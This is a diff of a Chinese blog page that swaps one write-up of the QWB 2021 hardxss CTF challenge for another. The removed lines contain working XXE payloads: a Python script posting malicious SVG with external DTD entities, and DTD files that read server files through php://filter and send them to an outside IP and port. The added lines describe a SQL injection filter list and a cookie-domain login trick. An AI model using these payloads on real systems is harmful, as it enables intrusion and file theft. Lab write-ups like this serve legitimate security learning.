@@ -158,7 +158,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://nama769.github.io/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://nama769.github.io/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -172,7 +172,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">强网杯2021-hardxss复现</a>
+            <a href="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/" class="post-title-link" itemprop="url">强网杯2021-hardxss战前准备</a>
         </h2>
 
         <div class="post-meta">
@@ -181,16 +181,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-07-18 21:58:03" itemprop="dateCreated datePublished" datetime="2021-07-18T21:58:03+08:00">2021-07-18</time>
+              <time title="创建时间：2021-07-18 21:58:03 / 修改时间：21:46:21" itemprop="dateCreated datePublished" datetime="2021-07-18T21:58:03+08:00">2021-07-18</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-29 02:18:05" itemprop="dateModified" datetime="2021-07-29T02:18:05+08:00">2021-07-29</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -216,38 +210,25 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="强网杯2021-hardxss复现"><a href="#强网杯2021-hardxss复现" class="headerlink" title="强网杯2021-hardxss复现"></a>强网杯2021-hardxss复现</h1><blockquote>
+          <h1 id="强网杯2021-hardxss战前准备"><a href="#强网杯2021-hardxss战前准备" class="headerlink" title="强网杯2021-hardxss战前准备"></a>强网杯2021-hardxss战前准备</h1><blockquote>
 <p><strong>参考WP</strong></p>
 <p><a target="_blank" rel="noopener" href="https://www.icystal.top/ctf15-qwb2021harderxss/">2021强网杯HarderXSS出题心得和非官方WP</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/">2021-强网杯Web-HarderXSS-复现-WP</a></p>
-<p><a target="_blank" rel="noopener" href="https://haoami.github.io/2021/07/23/2021-7-21-QWB_Hardxss%E5%A4%8D%E7%8E%B0/">KKfine’s blog QWB_Hardxss</a></p>
 <p><strong>题目链接</strong></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/crystalrays/qwb2021-harderxss">出题人的github</a></p>
 </blockquote>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>接着<a target="_blank" rel="noopener" href="https://naman.cool/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/">上次</a>的写，先用一个我最理解的方法打。upload.php的源码在上面其他的wp中都给到了。这里说一下重点的几行代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$decode</span>, LIBXML_DTDLOAD);<span class="comment">//第一次以LIBXML_DTDLOAD参数加载xml</span></span><br><span class="line"><span class="variable">$decode1</span> = <span class="variable">$dom</span>-&gt;saveXML();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*一些对decode1的过滤*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$decode</span>, LIBXML_NOENT);<span class="comment">//过滤后，第二次以LIBXML_NOENT参数加载xml</span></span><br><span class="line"><span class="variable">$decode</span> = <span class="variable">$dom</span>-&gt;saveXML();</span><br></pre></td></tr></table></figure>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>想把强网杯的那几道web全都复现。这次尝试一下hardxss。但有点困难。首先我连xss都不太会。所以只能是照着wp一步步来了。</p>
+<p>题目环境是直接在buu上起的。</p>
+<h2 id="0x01-xxe和xss前的步骤"><a href="#0x01-xxe和xss前的步骤" class="headerlink" title="0x01  xxe和xss前的步骤"></a>0x01  xxe和xss前的步骤</h2><img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/timu.png" class="">
 
-<p>本地调试后发现：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#调试脚本</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1/upload.php&quot;</span></span><br><span class="line">svg1=<span class="string">b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % secret SYSTEM &quot;http://*.*.*.*:*/path.php&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % visit_hacker SYSTEM &quot;http://*.*.*.*:*/test2.xml&quot;&gt;</span></span><br><span class="line"><span class="string">%visit_hacker;</span></span><br><span class="line"><span class="string">%hacker;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;hacker&gt;&amp;sending;&lt;/hacker&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">r=requests.post(url,</span><br><span class="line">                data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">b&quot;data:image/svg+xml;base64,&quot;</span>+base64.b64encode(svg1)&#125;,</span><br><span class="line">                cookies=&#123;<span class="string">&quot;XDEBUG_SESSION&quot;</span>:<span class="string">&quot;XDEBUG_ECLIPSE&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#path.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;php://filter/convert.base64-encode/resource=upload.php&quot;;?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#test2.xml</span></span><br><span class="line">&lt;!ENTITY % hacker <span class="string">&quot;&lt;!ENTITY sending SYSTEM &#x27;%secret;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>第一次loadXML时可以看到vps接收到了一次对于test2.xml的请求<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E5%A4%8D%E7%8E%B0/load1.png" class=""></p>
-<p>但因为loadXML的option参数为LIBXML_DTDLOAD，所以并没有加载外部的链接，所以有个疑问？为什么第一步时vps依然接收到了一次请求。目前还没太搞懂。</p>
-<p>第二次loadXML时不仅调试时感官上的卡了一下，vps也收到了两个请求。</p>
-<p>这次参数为LIBXML_NOENT，所以会将所有外部链接加载，但这之后已经没有过滤了。所以可以成功任意文件读取。</p>
-<p>这种打法成功的原因就在于题目只对第一次加载后的xml进行了过滤，并且第一次加载时出于安全考虑并未对xml完全加载。但其实我现在并没有理解第一次未完全加载的用处。看过wp发现这应该并不是出题人的预期解法，但这确实是我最理解的一个方法了。</p>
-<h2 id="0x01-尝试按照预期解复现"><a href="#0x01-尝试按照预期解复现" class="headerlink" title="0x01 尝试按照预期解复现"></a>0x01 尝试按照预期解复现</h2><p>按照预期，上面的那一步是无法任意文件读取的。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#预期的xml攻击脚本</span></span><br><span class="line">svg2=<span class="string">b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % sp SYSTEM &quot;http://*.*.*.*:*/test3.xml&quot;&gt;</span></span><br><span class="line"><span class="string">%sp;</span></span><br><span class="line"><span class="string">%param1;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;hacker&gt;666&lt;/hacker&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">r=requests.post(url,</span><br><span class="line">                data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">b&quot;data:image/svg+xml;base64,&quot;</span>+base64.b64encode(svg1)&#125;,</span><br><span class="line">                cookies=&#123;<span class="string">&quot;XDEBUG_SESSION&quot;</span>:<span class="string">&quot;XDEBUG_ECLIPSE&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#test3.xml</span></span><br><span class="line">&lt;!ENTITY % data SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=test.php&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % param1 <span class="string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://123.57.193.197:12003/%data;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<p>发现这样写第一次load和第二次load后的结果是一样的。这样因为第一次load后的过滤，就防止了任意文件读取。但为什么两种看似相同的写法却存在差别。。我目前还是没太搞懂，但我大受震撼。<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E5%A4%8D%E7%8E%B0/svg3.png" class=""></p>
-<p>按照预期，我们应该通过上法拿到</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> &gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.domain=<span class="string">&quot;cubestone.com&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">pageload</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.innerText=data;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript">fetch(<span class="string">`loader.php?callback=pageload&amp;secret=demo`</span>).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;<span class="keyword">return</span> res.text();&#125;).then(<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;<span class="built_in">eval</span>(data);&#125;)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageload(&#x27;Control center access require a vaild secret key. You entered a invaild secret!&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>得知是有关jsonp的，通过xml的xss实现跨域注册我们的service worker，这再次涉及了我的知识盲区。</p>
-<p>虽然这几天在学，但还是一知半解，今天暂时到这了，明天继续。</p>
+<p>第一步是在登录处的sql注入，简单fuzz一下大概过滤了</p>
+<p><code>ELSEIF EXPLAIN FROM GROUP IF INSERT JOIN LIMIT MODIFIES REGEXP SPECIFIC STRAIGHT_JOINTABLE UNION UPDATE WHERE</code></p>
+<p>不会注了，但万能密码可以直接登录<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/sql.png" class="">，但还没有完全登上。赛时的hint说注意domain，可以看到<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/cookies.png" class="">中登录后set-cookies了，但f12发现本机并没有cookies。仔细看发现domain不匹配。<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/cookies2.png" class="">这里可以手动设置一下。然后就可以登录了<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/login.png" class=""></p>
+<p>之后便是通过<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/xss.png" class="">进行攻击了。</p>
+<h2 id="0x02-没什么用的分段"><a href="#0x02-没什么用的分段" class="headerlink" title="0x02 没什么用的分段"></a>0x02 没什么用的分段</h2><p>为此我找了许多教程，<a target="_blank" rel="noopener" href="https://www.runoob.com/">简单学习了xml，dtd，dom······</a>。然后照着wp，打算先把upload.php源码获取到。但发现需要vps做外联dtd。<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/dtd.png" class="">并且要求ssl认证才行（这里我也不知道为啥非要https,反正如果我把脚本中的https换成http,就无法上传成功😭）。然而我的国内阿里云vps一直没有部署ssl，所以又花了小一天的时间搞这个。搞得差不多的时候才发现用域名去访问vps需要备案。。。可是我不想备案。所以就在阿里云下单了一个海外vps，然后如图<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/alvps.png" class="">。呵呵。真好用。问了一下群友们，群友们劝我放弃阿里云，告诉我腾讯的比较稳定，所以我又下单了一个腾讯的海外vps。<img src="/2021/07/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-hardxss%E6%88%98%E5%89%8D%E5%87%86%E5%A4%87/txvps.png" class=""></p>
+<p>然后开始搭建站点，部署ssl。过程还是比较曲折。加上今天离校（横跨半个北京去找高中同学），今天就到这里了。明天一定把https搞起来。</p>
+<h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>原本想复现hardxss的，结果整了一堆有的没的。。</p>
+<p>另外<strong>千万别用阿里云海外vps</strong></p>
 
       
     </div>
